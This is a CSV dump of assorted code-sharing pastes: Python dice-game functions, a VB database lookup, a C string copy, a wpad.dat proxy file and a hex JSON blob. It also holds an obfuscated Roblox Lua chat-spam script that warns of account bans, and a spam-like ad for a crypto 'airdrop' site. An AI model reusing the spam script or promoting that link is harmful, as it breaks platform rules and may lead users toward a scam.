id,title,username,language,date,content
AdZkKjQV,data801,TestGuy1,JSON,Tuesday 2nd of January 2024 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '2442049ce048269b11982e40aa7ac4a2d07163cbda656fdb373678e31caf3b04f08e322342e5bb243b01ad7616432113a4feef596ef53bef99c906af1ff0353976b395b55eae684259e8e3823fa6a8519b918782f4527006ce83e5068a0805579c9b1638679a24078dba828147c0b85e91dbb1e69fff531f2a69fc0172c0dc3f',
  otherdata: [
    '0ed98e1b271b815c3c2eae99db78a66a',
    'fde3564714628522c9d7b18da1a22b3e',
    '4af8de5f731e93e6a2644793d3144090',
    '0bc9d80c4d976a948c1b64be3bd13f6d',
    'a2b90bac982e237f60c5ef2990ed9d7b',
    'e02219c820c58e768a7374e3ee650498',
    '38133a9a1a28ff95f97f92d40b5dbcf8',
    '4e008e8658bf2a44380aaa686bfcddbb'
  ]
}"
BffnFkHt,wpad.dat,vojuara,JavaScript,Tuesday 2nd of January 2024 05:48:20 AM CDT,"function FindProxyForURL(url, host) { return ""PROXY 192.168.1.1:8080""; }';"
n4NZTJDS,pretty_shown_crew,angeldp,Python,Tuesday 2nd of January 2024 05:40:02 AM CDT,"def pretty_shown_crew(crew):
    """"""
    Shows crew and threat as a ASCII dice roll

    Parameters
    ----------
    crew : array or int
        Result of the dice roll.

    Returns
    -------
    None.

    """"""
    # Threat's dice sides in ascii
    PRETTY_DICE = {
        1: (
            ""┌─────────┐"",
            ""│         │"",
            ""│    ●    │"",
            ""│         │"",
            ""└─────────┘"",
        ),
        2: (
            ""┌─────────┐"",
            ""│  ●      │"",
            ""│         │"",
            ""│      ●  │"",
            ""└─────────┘"",
        ),
        3: (
            ""┌─────────┐"",
            ""│  ●      │"",
            ""│    ●    │"",
            ""│      ●  │"",
            ""└─────────┘"",
        ),
        4: (
            ""┌─────────┐"",
            ""│  ●   ●  │"",
            ""│         │"",
            ""│  ●   ●  │"",
            ""└─────────┘"",
        ),
        5: (
            ""┌─────────┐"",
            ""│  ●   ●  │"",
            ""│    ●    │"",
            ""│  ●   ●  │"",
            ""└─────────┘"",
        ),
        6: (
            ""┌─────────┐"",
            ""│  ●   ●  │"",
            ""│  ●   ●  │"",
            ""│  ●   ●  │"",
            ""└─────────┘"",
        ),
    }
    # Crew dice sides in ascii
    PRETTY_CREW = {
        1: (
            ""┌─────────┐"",
            ""│  \\\\ //  │"",  # SCAPE \
            ""│   \\▼/   │"",   # SCAPE \
            ""│   └│┘   │"",
            ""│    ║   1│"",
            ""└─────────┘"",
        ),
        2: (
            ""┌─────────┐"",
            ""│    ▲    │"",
            ""│   /█\\   │"",   # SCAPE \
            ""│    ║    │"",
            ""│    │   2│"",
            ""└─────────┘"",
        ),
        3: (
            ""┌─────────┐"",
            ""│   ╞█╡   │"",
            ""│ ╞█► ◄█╡ │"",
            ""│   ╞█╡   │"",
            ""│        3│"",
            ""└─────────┘"",
        ),
        4: (
            ""┌─────────┐"",
            ""│   O__   │"",
            ""│    __ ● │"",
            ""│ ╔╗/     │"",
            ""│ ╚╝     4│"",
            ""└─────────┘"",
        ),
        5: (
            ""┌─────────┐"",
            ""│ ╔╪╗     │"",
            ""│ ╠ ╣     │"",
            ""│ ╚╪╝ ╔╗  │"",
            ""│     ╚╝ 5│"",
            ""└─────────┘"",
        ),
        6: (
            ""┌────╥────┐"",
            ""│    ║    │"",
            ""│   ╔╩╗   │"",
            ""│   ║☺║   │"",
            ""│   ╚═╝  6│"",
            ""└─────────┘"",
        ),
    }

    # If the function receives an array, use the crew dice.
    if isinstance(crew, list):
        DICE = PRETTY_CREW
        DICE_ROWS = len(DICE[1])
        DICE_SEP = ' '
        pretty_faces = []
        for n in crew:
            pretty_faces.append(DICE[n])
            dice_faces_rows = []
            for row_id in range(DICE_ROWS):
                row_components = []
                for die in pretty_faces:
                    row_components.append(die[row_id])
                row_string = DICE_SEP.join(row_components)
                dice_faces_rows.append(row_string)
        width = len(dice_faces_rows[0])
        diagram_header = "" CREW "".center(width, ""~"")
        dice_faces_diagram = ""\n"".join([diagram_header] + dice_faces_rows)
    # If the function receives an integer, it uses traditional dice.
    if isinstance(crew, int):
        DICE = PRETTY_DICE
        DICE_ROWS = len(DICE[1])
        DICE_SEP = ' '
        pretty_faces = []
        pretty_faces.append(DICE[1])
        dice_faces_rows = []
        for row_id in range(DICE_ROWS):
            row_components = []
            for die in pretty_faces:
                row_components.append(die[row_id])
            row_string = DICE_SEP.join(row_components)
            dice_faces_rows.append(row_string)
        width = len(dice_faces_rows[0])
        diagram_header = "" THREAT "".center(width, ""~"")
        dice_faces_diagram = ""\n"".join([diagram_header] + dice_faces_rows)
    # the result is shown
    print(f""{dice_faces_diagram}\n"")
"
8zJWayYW,BIG TEXT CHAT,Vincent_Ablat,Lua,Tuesday 2nd of January 2024 05:38:16 AM CDT,"--Big Text Chat
local textToChat = 'BOYKISSER' -- what to chat with big text
-- ⚠️WARNING | I AM NOT RESPONSIBLE IF YOUR ACCOUNT GETS BANNED! PLEASE USE THIS ON AN ALT ACCOUNT!

local v0={};string.lower(textToChat):gsub(""."",function(v8)table.insert(v0,v8);end);local v1="""";local v2="""";local v3="""";local v4="""";local v5="""";local v6="""";local v7="""";for v9,v10 in ipairs(v0) do local v11=1047 -(67 + 980) ;while true do if (v11==(1476 -(1329 + 145))) then if (v10==""f"") then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴🔴🔴"" ;v3=v3   .. ""⬛🔴⬛⬛"" ;v4=v4   .. ""⬛🔴🔴⬛"" ;v5=v5   .. ""⬛🔴⬛⬛"" ;v6=v6   .. ""⬛🔴⬛⬛"" ;v7=v7   .. ""⬛⬛⬛⬛"" ;end if (v10==""g"") then local v13=0;while true do if (v13==(972 -(140 + 831))) then v3=v3   .. ""⬛🔴⬛⬛"" ;v4=v4   .. ""⬛🔴⬛🔴"" ;v13=2;end if (v13==(1852 -(1409 + 441))) then v5=v5   .. ""⬛🔴⬛🔴"" ;v6=v6   .. ""⬛🔴🔴🔴"" ;v13=3;end if (v13==(721 -(15 + 703))) then v7=v7   .. ""⬛⬛⬛⬛"" ;break;end if (v13==(0 + 0)) then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴🔴🔴"" ;v13=439 -(262 + 176) ;end end end if (v10==""h"") then local v14=0;while true do if (1==v14) then v3=v3   .. ""⬛🔴⬛🔴"" ;v4=v4   .. ""⬛🔴🔴🔴"" ;v14=1723 -(345 + 1376) ;end if (v14==(688 -(198 + 490))) then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴⬛🔴"" ;v14=4 -3 ;end if (v14==(4 -2)) then v5=v5   .. ""⬛🔴⬛🔴"" ;v6=v6   .. ""⬛🔴⬛🔴"" ;v14=1209 -(696 + 510) ;end if (v14==(5 -2)) then v7=v7   .. ""⬛⬛⬛⬛"" ;break;end end end v11=1265 -(1091 + 171) ;end if (v11==8) then if (v10==""y"") then local v15=0;while true do if (1==v15) then v3=v3   .. ""⬛🔴⬛🔴"" ;v4=v4   .. ""⬛⬛🔴⬛"" ;v15=1 + 1 ;end if (v15==0) then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴⬛🔴"" ;v15=3 -2 ;end if (v15==2) then v5=v5   .. ""⬛⬛🔴⬛"" ;v6=v6   .. ""⬛⬛🔴⬛"" ;v15=9 -6 ;end if (v15==3) then v7=v7   .. ""⬛⬛⬛⬛"" ;break;end end end if (v10==""z"") then local v16=0;while true do if (v16==(376 -(123 + 251))) then v5=v5   .. ""⬛🔴⬛⬛"" ;v6=v6   .. ""⬛🔴🔴🔴"" ;v16=3;end if (v16==(0 -0)) then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴🔴🔴"" ;v16=1;end if (v16==1) then v3=v3   .. ""⬛⬛⬛🔴"" ;v4=v4   .. ""⬛⬛🔴⬛"" ;v16=700 -(208 + 490) ;end if (v16==(1 + 2)) then v7=v7   .. ""⬛⬛⬛⬛"" ;break;end end end break;end if (v11==5) then if (v10==""o"") then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴🔴🔴"" ;v3=v3   .. ""⬛🔴⬛🔴"" ;v4=v4   .. ""⬛🔴⬛🔴"" ;v5=v5   .. ""⬛🔴⬛🔴"" ;v6=v6   .. ""⬛🔴🔴🔴"" ;v7=v7   .. ""⬛⬛⬛⬛"" ;end if (v10==""p"") then local v17=0 + 0 ;while true do if (1==v17) then v3=v3   .. ""⬛🔴⬛🔴"" ;v4=v4   .. ""⬛🔴🔴🔴"" ;v17=838 -(660 + 176) ;end if (v17==3) then v7=v7   .. ""⬛⬛⬛⬛"" ;break;end if (v17==0) then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴🔴🔴"" ;v17=1;end if ((1 + 1)==v17) then v5=v5   .. ""⬛🔴⬛⬛"" ;v6=v6   .. ""⬛🔴⬛⬛"" ;v17=205 -(14 + 188) ;end end end if (v10==""q"") then v1=v1   .. ""⬛⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴🔴🔴"" ;v3=v3   .. ""⬛🔴⬛🔴⬛"" ;v4=v4   .. ""⬛🔴⬛🔴⬛"" ;v5=v5   .. ""⬛🔴🔴🔴⬛"" ;v6=v6   .. ""⬛🔴🔴🔴🔴"" ;v7=v7   .. ""⬛⬛⬛⬛⬛"" ;end v11=6;end if (v11==0) then if (v10=="" "") then local v18=675 -(534 + 141) ;while true do if (v18==(2 + 1)) then v7=v7   .. ""⬛"" ;break;end if (v18==(1 + 0)) then v3=v3   .. ""⬛"" ;v4=v4   .. ""⬛"" ;v18=2 + 0 ;end if (0==v18) then v1=v1   .. ""⬛"" ;v2=v2   .. ""⬛"" ;v18=1 -0 ;end if (2==v18) then v5=v5   .. ""⬛"" ;v6=v6   .. ""⬛"" ;v18=3;end end end if (v10==""a"") then local v19=0 -0 ;while true do if (v19==(0 -0)) then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴🔴🔴"" ;v19=1 + 0 ;end if (v19==1) then v3=v3   .. ""⬛🔴⬛🔴"" ;v4=v4   .. ""⬛🔴🔴🔴"" ;v19=2 + 0 ;end if (v19==(398 -(115 + 281))) then v5=v5   .. ""⬛🔴⬛🔴"" ;v6=v6   .. ""⬛🔴⬛🔴"" ;v19=6 -3 ;end if (v19==(3 + 0)) then v7=v7   .. ""⬛⬛⬛⬛"" ;break;end end end if (v10==""b"") then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴🔴⬛"" ;v3=v3   .. ""⬛🔴⬛🔴"" ;v4=v4   .. ""⬛🔴🔴⬛"" ;v5=v5   .. ""⬛🔴⬛🔴"" ;v6=v6   .. ""⬛🔴🔴⬛"" ;v7=v7   .. ""⬛⬛⬛⬛"" ;end v11=1;end if (v11==(7 -4)) then if (v10==""i"") then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴🔴🔴"" ;v3=v3   .. ""⬛⬛🔴⬛"" ;v4=v4   .. ""⬛⬛🔴⬛"" ;v5=v5   .. ""⬛⬛🔴⬛"" ;v6=v6   .. ""⬛🔴🔴🔴"" ;v7=v7   .. ""⬛⬛⬛⬛"" ;end if (v10==""j"") then local v20=0;while true do if (v20==(0 -0)) then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴🔴🔴"" ;v20=1;end if (v20==2) then v5=v5   .. ""⬛⬛⬛🔴"" ;v6=v6   .. ""⬛🔴🔴⬛"" ;v20=870 -(550 + 317) ;end if (v20==1) then v3=v3   .. ""⬛⬛⬛🔴"" ;v4=v4   .. ""⬛⬛⬛🔴"" ;v20=2 -0 ;end if (v20==3) then v7=v7   .. ""⬛⬛⬛⬛"" ;break;end end end if (v10==""k"") then local v21=0;while true do if (v21==(2 -0)) then v5=v5   .. ""⬛🔴⬛🔴"" ;v6=v6   .. ""⬛🔴⬛🔴"" ;v21=3;end if (v21==1) then v3=v3   .. ""⬛🔴⬛🔴"" ;v4=v4   .. ""⬛🔴🔴⬛"" ;v21=5 -3 ;end if ((285 -(134 + 151))==v21) then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴⬛⬛"" ;v21=1;end if (v21==3) then v7=v7   .. ""⬛⬛⬛⬛"" ;break;end end end v11=1669 -(970 + 695) ;end if (v11==(11 -5)) then if (v10==""r"") then local v22=1990 -(582 + 1408) ;while true do if (v22==(10 -7)) then v7=v7   .. ""⬛⬛⬛⬛"" ;break;end if ((1 -0)==v22) then v3=v3   .. ""⬛🔴⬛🔴"" ;v4=v4   .. ""⬛🔴🔴🔴"" ;v22=7 -5 ;end if (v22==(1826 -(1195 + 629))) then v5=v5   .. ""⬛🔴🔴⬛"" ;v6=v6   .. ""⬛🔴⬛🔴"" ;v22=3 -0 ;end if (v22==(241 -(187 + 54))) then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴🔴🔴"" ;v22=781 -(162 + 618) ;end end end if (v10==""s"") then local v23=0 + 0 ;while true do if (v23==(2 + 0)) then v5=v5   .. ""⬛⬛⬛🔴"" ;v6=v6   .. ""⬛🔴🔴🔴"" ;v23=6 -3 ;end if ((1 -0)==v23) then v3=v3   .. ""⬛🔴⬛⬛"" ;v4=v4   .. ""⬛🔴🔴🔴"" ;v23=1 + 1 ;end if ((1636 -(1373 + 263))==v23) then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴🔴🔴"" ;v23=1001 -(451 + 549) ;end if (v23==3) then v7=v7   .. ""⬛⬛⬛⬛"" ;break;end end end if (v10==""t"") then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴🔴🔴"" ;v3=v3   .. ""⬛⬛🔴⬛"" ;v4=v4   .. ""⬛⬛🔴⬛"" ;v5=v5   .. ""⬛⬛🔴⬛"" ;v6=v6   .. ""⬛⬛🔴⬛"" ;v7=v7   .. ""⬛⬛⬛⬛"" ;end v11=3 + 4 ;end if (v11==1) then if (v10==""c"") then local v24=0 -0 ;while true do if (v24==2) then v5=v5   .. ""⬛🔴⬛⬛"" ;v6=v6   .. ""⬛⬛🔴🔴"" ;v24=3;end if ((1 -0)==v24) then v3=v3   .. ""⬛🔴⬛⬛"" ;v4=v4   .. ""⬛🔴⬛⬛"" ;v24=2;end if ((1384 -(746 + 638))==v24) then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛⬛🔴🔴"" ;v24=1 + 0 ;end if (v24==(4 -1)) then v7=v7   .. ""⬛⬛⬛⬛"" ;break;end end end if (v10==""d"") then local v25=341 -(218 + 123) ;while true do if (v25==(1581 -(1535 + 46))) then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴🔴⬛"" ;v25=1;end if (v25==2) then v5=v5   .. ""⬛🔴⬛🔴"" ;v6=v6   .. ""⬛🔴🔴⬛"" ;v25=3 + 0 ;end if (v25==1) then v3=v3   .. ""⬛🔴⬛🔴"" ;v4=v4   .. ""⬛🔴⬛🔴"" ;v25=1 + 1 ;end if (v25==(563 -(306 + 254))) then v7=v7   .. ""⬛⬛⬛⬛"" ;break;end end end if (v10==""e"") then local v26=0 + 0 ;while true do if (v26==(0 -0)) then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴🔴🔴"" ;v26=1;end if (v26==(1468 -(899 + 568))) then v3=v3   .. ""⬛🔴⬛⬛"" ;v4=v4   .. ""⬛🔴🔴🔴"" ;v26=2;end if (v26==3) then v7=v7   .. ""⬛⬛⬛⬛"" ;break;end if (v26==2) then v5=v5   .. ""⬛🔴⬛⬛"" ;v6=v6   .. ""⬛🔴🔴🔴"" ;v26=2 + 1 ;end end end v11=4 -2 ;end if (v11==(610 -(268 + 335))) then if (v10==""u"") then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴⬛🔴"" ;v3=v3   .. ""⬛🔴⬛🔴"" ;v4=v4   .. ""⬛🔴⬛🔴"" ;v5=v5   .. ""⬛🔴⬛🔴"" ;v6=v6   .. ""⬛🔴🔴🔴"" ;v7=v7   .. ""⬛⬛⬛⬛"" ;end if (v10==""v"") then local v27=0;while true do if (v27==(290 -(60 + 230))) then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴⬛🔴"" ;v27=1;end if (v27==(573 -(426 + 146))) then v3=v3   .. ""⬛🔴⬛🔴"" ;v4=v4   .. ""⬛🔴⬛🔴"" ;v27=1 + 1 ;end if (v27==(1458 -(282 + 1174))) then v5=v5   .. ""⬛🔴⬛🔴"" ;v6=v6   .. ""⬛⬛🔴⬛"" ;v27=814 -(569 + 242) ;end if (3==v27) then v7=v7   .. ""⬛⬛⬛⬛"" ;break;end end end if (v10==""x"") then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴⬛🔴"" ;v3=v3   .. ""⬛🔴⬛🔴"" ;v4=v4   .. ""⬛⬛🔴⬛"" ;v5=v5   .. ""⬛🔴⬛🔴"" ;v6=v6   .. ""⬛🔴⬛🔴"" ;v7=v7   .. ""⬛⬛⬛⬛"" ;end v11=8;end if (v11==4) then if (v10==""l"") then local v28=0 -0 ;while true do if (v28==(1 + 1)) then v5=v5   .. ""⬛🔴⬛⬛"" ;v6=v6   .. ""⬛🔴🔴🔴"" ;v28=1027 -(706 + 318) ;end if ((1252 -(721 + 530))==v28) then v3=v3   .. ""⬛🔴⬛⬛"" ;v4=v4   .. ""⬛🔴⬛⬛"" ;v28=1273 -(945 + 326) ;end if (v28==(7 -4)) then v7=v7   .. ""⬛⬛⬛⬛"" ;break;end if (v28==(0 + 0)) then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴⬛⬛"" ;v28=701 -(271 + 429) ;end end end if (v10==""m"") then local v29=0 + 0 ;while true do if ((1502 -(1408 + 92))==v29) then v5=v5   .. ""⬛🔴⬛🔴⬛🔴"" ;v6=v6   .. ""⬛🔴⬛🔴⬛🔴"" ;v29=1089 -(461 + 625) ;end if (v29==3) then v7=v7   .. ""⬛⬛⬛⬛⬛⬛"" ;break;end if ((1288 -(993 + 295))==v29) then v1=v1   .. ""⬛⬛⬛⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴🔴🔴🔴⬛"" ;v29=1;end if (v29==1) then v3=v3   .. ""⬛🔴⬛🔴⬛🔴"" ;v4=v4   .. ""⬛🔴⬛🔴⬛🔴"" ;v29=2;end end end if (v10==""n"") then local v30=0 + 0 ;while true do if (v30==(1171 -(418 + 753))) then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴🔴🔴"" ;v30=1 + 0 ;end if ((1 + 0)==v30) then v3=v3   .. ""⬛🔴⬛🔴"" ;v4=v4   .. ""⬛🔴⬛🔴"" ;v30=2;end if (v30==(1 + 2)) then v7=v7   .. ""⬛⬛⬛⬛"" ;break;end if (v30==(1 + 1)) then v5=v5   .. ""⬛🔴⬛🔴"" ;v6=v6   .. ""⬛🔴⬛🔴"" ;v30=3;end end end v11=5;end end end function v31(v12) if game then game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(v12,""All""); wait(.01); else print(v12) end end v1=v1   .. ""⬛"" ;v2=v2   .. ""⬛"" ;v3=v3   .. ""⬛"" ;v4=v4   .. ""⬛"" ;v5=v5   .. ""⬛"" ;v6=v6   .. ""⬛"" ;v7=v7   .. ""⬛"" ;v31(v1);v31(v2);v31(v3);v31(v4);v31(v5);v31(v6);v31(v7);"
g7k9NBVr,clear_screen,angeldp,Python,Tuesday 2nd of January 2024 05:37:36 AM CDT,"def clear_screen():
    """"""
    Clear the user screen based on the operating system used

    Returns
    -------
    None.

    """"""

    if name == ""posix"":
        system(""clear"")
    elif name == ""ce"" or name == ""nt"" or name == ""dos"":
        system(""cls"")"
CagzK9zg,commander,angeldp,Python,Tuesday 2nd of January 2024 05:27:13 AM CDT,"def commander(crew):
    """"""
    Actions to perform with each '1' obtained in the roll.
    It must ask if you want to change any crew member or re-roll
    available crew.
    It will need to validate all user input.
    It needs the crew array and returns it modified

    Parameters
    ----------
    crew : array
        Result of the dice roll.

    Returns
    -------
    crew : array
        Dice roll result modified by commander.

    """"""

    print('Commander available:')
    # The key pressed by the user is stored in 'c'.
    c = 'x'
    oldcrew = ''
    # Prompt until a valid value is obtained
    while c.lower() != 'c' and c.lower() != 'r':
        c = input(""Do you want to change any members of your crew (c) \n \
        or re-roll de dice (r)? c/r\n"")
    if c.lower() == 'c':
        # At this point 'c' is used to validate that the number is on the
        # 'crew' (an unavailable crew member cannot be changed)
        c = 'n'
        while c == 'n':
            # 'cont' stores the position in the array in which
            # the indicated value is located
            cont = 0
            oldcrew = int(input(""Number of the crew member to be replaced:""))
            # If a 6 (scanner) has been indicated, it moves on to the next
            # iteration without doing anything else (continues requesting
            # a crew member until a valid value is received)
            if oldcrew == 6:
                continue
            for i in crew:
                if i == oldcrew:
                    # If the entered value is available, the new value is
                    # requested, making sure that a value between 2 and 5
                    # was indicated.
                    newcrew = 1
                    while newcrew < 2 or newcrew > 5:
                        newcrew = int(
                            input(""Value of the new crew member (2-5)""))
                    crew[cont] = newcrew
                    # 'c' is updated to stop prompting.
                    c = ''
                    break
                cont += 1
    elif c.lower() == 'r':
        ncrew = []
        cont = 0
        while cont < len(crew):
            if crew[cont] == 1 or crew[cont] == 6:
                ncrew.append(crew[cont])
            else:
                ncrew.append(randint(1, 6))
            cont += 1
        # Crew update
        crew = ncrew
    if c == 'c':
        print(f'Successfully changed {oldcrew} to {newcrew}')
    print(f""Nueva tripulación: {crew}"")
    pretty_shown_crew(crew)
    return crew"
qJKNvR3P,Search nearest number,Dotterbart,VisualBasic,Tuesday 2nd of January 2024 05:16:22 AM CDT,"Function SearchNearest(intSearch As Integer) As Integer
Dim DB As DAO.Database
Dim RS As DAO.Recordset
Dim strSQL, strMax, strMin As String
Dim intMax, intMin As Integer
Dim intDifMax, intDifMin As Integer

Set DB = CurrentDb

strSQL = ""SELECT TOP 1 BuchArtikel_ID FROM Buchung WHERE BuchArtikel_ID <= "" & CStr(intSearch) & "" ORDER BY Buchung.BuchArtikel_ID DESC;""
Set RS = DB.OpenRecordset(strSQL)
If RS.RecordCount > 0 Then
    intMin = RS!BuchArtikel_ID
Else
    intMin = 0
End If

strSQL = ""SELECT TOP 1 BuchArtikel_ID FROM Buchung WHERE BuchArtikel_ID >= "" & CStr(intSearch) & "" ORDER BY Buchung.BuchArtikel_ID ASC;""
Set RS = DB.OpenRecordset(strSQL)

If RS.RecordCount > 0 Then
    intMax = RS!BuchArtikel_ID
Else
    intMax = 0
End If

intDifMax = (intSearch - intMax) * -1
intDifMin = intSearch - intMin
Debug.Print intDifMax
Debug.Print intDifMin

If intDifMin > intDifMax Then
    SearchNearest = intMax
Else
    SearchNearest = intMin
End If

RS.Close
DB.Close
Set DB = Nothing
Set RS = Nothing
End Function"
HLUev3UH,Untitled,dllbridge,C,Tuesday 2nd of January 2024 05:14:48 AM CDT,"


#include   <stdio.h>
#include  <string.h>    


char sz1[123] = ""SONY"",
     sz2[123] = "" ONE, Two"";
	   
	   
	   
//////////////////////////////////////////////////////	   
void _strcpy(char *p1, char *p2)
{
     int n = strlen(p2);
     
     for(int i = 0; i < n; i++)
     {
       
         sz1[i] = sz2[i];
	 }
     sz1[n] = 0;
}
	   
	   
	   
	   
 
//////////////////////////////////////////////////////
int main()
{
	
	_strcpy(sz1, sz2);

			 	
    printf(""%s \n"", sz1); 	
  
return 0;
}

"
VdNnbh8q,List of all FREE Crypto Airdrops!,VQ-Moe,GetText,Tuesday 2nd of January 2024 05:10:05 AM CDT,"Looking for a list of all the current, free airdrops from all blockchains?
We have a solution - https://netdrop.netlify.app/

Join 100,000+ people claiming crypto airdrops on all available networks.
No more finding airdrops; the airdrops find you.

Visit NetDrop completely free now, no sign-up required.
https://netdrop.netlify.app/

BT316461"
WSFuTtRp,main_program,angeldp,Python,Tuesday 2nd of January 2024 05:02:34 AM CDT,"def main_program(deck, scant, crewn):
    """"""
    Main program

    Parameters
    ----------
    deck : array
        Deck of threat cards
    scant : int
        Busy scanners number from 0 to 2
    crewn : int
        Available crew members from 0 to 6

    Returns
    -------
    int
        0 without error.

    """"""
    i = 0
    while len(deck) > 0:
        clear_screen()
        print(f'Round #{i + 1}')
        print(""\nStep 1: Roll all available Crew Dice"")
        crew = generate_crew(crewn)
        print(crew)
        pretty_shown_crew(crew)
        scant = scan_threats(crew, scant, deck)
        print(""\nStep 2: Assign scanners"")
        print(f""You have {scant} scanners in use"")
        print(""\nStep 3: Assign Crew"")
        assign_crew(crew)
        print(crew)
        print(""\nStep 4: Draw a new threat card"")
        deck = new_threat(deck)
        print(f""{len(deck)} card(s) remaining"")
        print(""\nStep 5: Roll threat die"")
        activate_threat()
        print(""\nStep 6:Gather all available Crew"")
        crewn = 6 - scant
        if crewn < 1:
            print('You lost!')
            return 0
        print(f""{crewn} crew members available\n"")
        i += 1
        input(""Press enter to start the next round\n"")
    print('Won!')
    input('Press enter to exit')
    return 0"
